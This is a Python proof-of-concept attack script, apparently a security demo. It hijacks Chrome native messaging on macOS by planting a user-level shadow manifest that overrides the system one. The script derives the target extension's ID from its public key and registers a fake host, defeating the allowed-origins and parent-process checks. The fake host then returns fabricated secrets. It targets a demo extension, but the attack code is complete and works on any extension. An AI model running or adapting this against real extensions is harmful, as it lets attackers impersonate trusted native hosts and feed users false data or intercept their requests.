#!/usr/bin/env python3
"""
Attack 2: Host Imitation
=========================
Drops a user-level shadow manifest that points Chrome at a fake NM host.
Because Chrome reads user-level manifests first, the fake host is spawned
instead of the real one — satisfying the parent-process check automatically.
The fake host returns a fabricated secret, breaking the victim's workflow.

Modes:
  --setup              (run by tester) : narrated walkthrough of every step
  chrome-extension://… (spawned by Chrome) : fake NM host — returns fake secret

Run: python3 attack2_host_imitation.py --setup
"""

import sys, os, json, struct, subprocess, hashlib, base64
import time, signal

# ── Paths ─────────────────────────────────────────────────────────────────────

SCRIPT_DIR    = os.path.dirname(os.path.abspath(__file__))
DEMO_DIR      = os.path.dirname(SCRIPT_DIR)
DEMO_EXT      = os.path.join(DEMO_DIR, "demo_extension", "manifest.json")

HOST_NAME     = "com.demo.securevault"
SYSTEM_NM_DIR = "/Library/Google/Chrome/NativeMessagingHosts"
USER_NM_DIR   = os.path.expanduser(
    "~/Library/Application Support/Google/Chrome/NativeMessagingHosts"
)
SHADOW_MANIFEST = os.path.join(USER_NM_DIR, f"{HOST_NAME}.json")
STOLEN_LOG    = os.path.join(SCRIPT_DIR, ".host_imitation_stolen.log")

# ── Printing helpers ───────────────────────────────────────────────────────────

def banner():
    print("\n" + "="*65)
    print("  ATTACK 2: HOST IMITATION")
    print("  Fake NM host replaces real host, returns fabricated secret")
    print("="*65)

def control(n, msg):
    print(f"\n  Control {n}: {msg}")

def step(n, title):
    print(f"\n  Step {n}: {title}")
    print(f"  {'─'*55}")

def info(msg):
    print(f"            {msg}")

def bypass(msg):
    print(f"\n  >> {msg}")

def pause(msg="  Press Enter to continue..."):
    input(f"\n{msg}")


# ── Key extraction ─────────────────────────────────────────────────────────────

def extract_key_and_id():
    """Derive the victim extension ID from the public key in its manifest."""
    with open(DEMO_EXT) as f:
        m = json.load(f)
    key_b64 = m.get("key")
    if not key_b64:
        print("  ERROR: demo_extension/manifest.json has no 'key' field.")
        sys.exit(1)
    pub_der = base64.b64decode(key_b64)
    sha = hashlib.sha256(pub_der).hexdigest()[:32]
    ext_id = ''.join(chr(ord('a') + int(c, 16)) for c in sha)
    return key_b64, ext_id


# ── Manifest helpers ───────────────────────────────────────────────────────────

def read_system_manifest():
    path = os.path.join(SYSTEM_NM_DIR, f"{HOST_NAME}.json")
    try:
        with open(path) as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"  ERROR: System manifest not found. Run install.sh first.")
        sys.exit(1)
    except PermissionError:
        print(f"  ERROR: Cannot read {path}. Run: sudo chmod 644 {path}")
        sys.exit(1)

def write_shadow_manifest(fake_host_path, ext_id):
    os.makedirs(USER_NM_DIR, exist_ok=True)
    manifest = {
        "name": HOST_NAME,
        "description": "Demo fake host",
        "path": fake_host_path,
        "type": "stdio",
        "allowed_origins": [f"chrome-extension://{ext_id}/"]
    }
    with open(SHADOW_MANIFEST, 'w') as f:
        json.dump(manifest, f, indent=2)

def restore_shadow():
    if os.path.exists(SHADOW_MANIFEST):
        os.remove(SHADOW_MANIFEST)
        print("\n  Cleaned up: shadow manifest removed.")


# ── NM I/O helpers ─────────────────────────────────────────────────────────────

def read_nm(pipe):
    raw = pipe.read(4)
    if len(raw) < 4:
        return None
    length = struct.unpack('<I', raw)[0]
    data = pipe.read(length)
    return json.loads(data.decode('utf-8'))

def write_nm(pipe, msg):
    encoded = json.dumps(msg).encode('utf-8')
    pipe.write(struct.pack('<I', len(encoded)))
    pipe.write(encoded)
    pipe.flush()


# ── SETUP MODE ─────────────────────────────────────────────────────────────────

def run_setup():
    banner()

    print("\n  Controls in place:")
    control(1, "The NM manifest is installed at the system level "
               "(/Library/Google/Chrome/NativeMessagingHosts/), "
               "root-owned, requires administrator privileges to modify.")
    control(2, "The manifest lists allowed_origins, Chrome only forwards "
               "connections from the specific victim extension ID to this host.")
    control(3, "The demo victim host verifies its parent process is Google Chrome "
               "before responding to any request.")

    pause()

    # ── Step 1: Locate the manifest ───────────────────────────────────────────
    step(1, "Locating the NM manifest")

    sys_manifest_path = os.path.join(SYSTEM_NM_DIR, f"{HOST_NAME}.json")
    if os.path.exists(sys_manifest_path):
        info(f"System manifest: {sys_manifest_path} (root-owned)")
    else:
        info("System-level manifest not found. Run install.sh first.")
        sys.exit(1)

    bypass("Bypassing Control 1: the user-level NM directory is always writable, "
           "a same-named file there silently overrides the system-level entry.")

    pause()

    # ── Step 2: Read manifest, derive extension ID, write shadow manifest ─────
    step(2, "Deriving the extension ID and planting the shadow manifest")

    sys_manifest = read_system_manifest()
    real_host_path = sys_manifest["path"]
    info(f"Demo victim host: {real_host_path}")
    info(f"allowed_origins:  {sys_manifest['allowed_origins']}")
    info("")
    info("Extension IDs are derived from the public key (SHA-256 of DER bytes,")
    info("first 32 nibbles mapped a-p). Key sources: .crx package, Chrome Preferences /")
    info("Secure Preferences (extensions.settings.<id>.manifest.key), installed")
    info("extension directory, or unpacked manifest.json.")
    info("")

    key_b64, ext_id = extract_key_and_id()
    info(f"Public key (first 60 chars): {key_b64[:60]}...")
    info(f"Derived extension ID:        {ext_id}")

    bypass("Bypassing Control 2: shadow manifest sets allowed_origins to the derived ID, "
           "Chrome routes the victim extension's connection to our fake host.")

    info("")
    wrapper_sh = os.path.join(SCRIPT_DIR, ".host_wrapper.sh")
    python_bin = sys.executable
    with open(wrapper_sh, 'w') as f:
        f.write(
            f"#!/bin/bash\n"
            f"exec \"{python_bin}\" \"{os.path.abspath(__file__)}\" \"$@\"\n"
        )
    os.chmod(wrapper_sh, 0o755)

    write_shadow_manifest(wrapper_sh, ext_id)
    info(f"Shadow manifest: {SHADOW_MANIFEST}")
    info(f"Points to:       {wrapper_sh}")
    info("")
    info("Chrome spawns the fake host directly, Chrome is its parent, so the")
    info("parent check passes without spoofing.")

    bypass("Bypassing Control 3: Chrome is the real parent, no spoofing needed.")

    def cleanup(sig=None, frame=None):
        print("\n\n  Cleaning up...")
        restore_shadow()
        print("  Done.")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)

    # ── Step 3: Wait for the victim to trigger the extension ──────────────────
    step(3, "Waiting for the victim to trigger the demo victim extension")
    info("")
    info("  1. Open Chrome (your normal browser profile).")
    info("  2. Click the SecureVault extension popup -> Get Secret.")
    info("")
    info("  Fake host returns 'fake_secret_123'. Output appears below.")
    info("  Press Ctrl+C to stop.")
    info("")

    try:
        if os.path.exists(STOLEN_LOG):
            os.remove(STOLEN_LOG)
        while True:
            time.sleep(0.3)
            if os.path.exists(STOLEN_LOG):
                with open(STOLEN_LOG) as f:
                    content = f.read()
                if content:
                    for line in content.strip().split('\n'):
                        if 'fake secret' in line.lower() or 'secret' in line.lower():
                            print(f"\n  {'*'*55}")
                            print(f"  {line.strip()}")
                            print(f"  {'*'*55}")
                        else:
                            print(f"  {line.strip()}")
                    with open(STOLEN_LOG, 'w') as f:
                        f.write('')
    except KeyboardInterrupt:
        cleanup()


# ── FAKE HOST MODE (spawned by Chrome via the shadow manifest) ─────────────────

def run_fake_host():
    """
    Chrome spawns this when the demo victim extension calls connectNative.
    Receives NM messages and replies with fake data — the real host is never
    contacted, so the user receives wrong data and the real secret is never served.
    """
    def log(msg):
        with open(STOLEN_LOG, 'a') as f:
            f.write(msg + '\n')

    while True:
        msg = read_nm(sys.stdin.buffer)
        if msg is None:
            break

        action = msg.get("action")
        log(f"[fake-host] received action={action!r}")

        if action == "get_secret":
            fake_secret = "fake_secret_123"
            log(f"[fake-host] returning fake secret: {fake_secret}")
            write_nm(sys.stdout.buffer, {"secret": fake_secret})

        elif action == "get_version":
            write_nm(sys.stdout.buffer, {"version": "1.0"})

        else:
            write_nm(sys.stdout.buffer, {"error": f"unknown action: {action}"})


# ── Entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--setup":
        run_setup()
    elif len(sys.argv) > 1 and sys.argv[1].startswith("chrome-extension://"):
        run_fake_host()
    else:
        print("Usage:")
        print("  python3 attack2_host_imitation.py --setup")
        sys.exit(1)
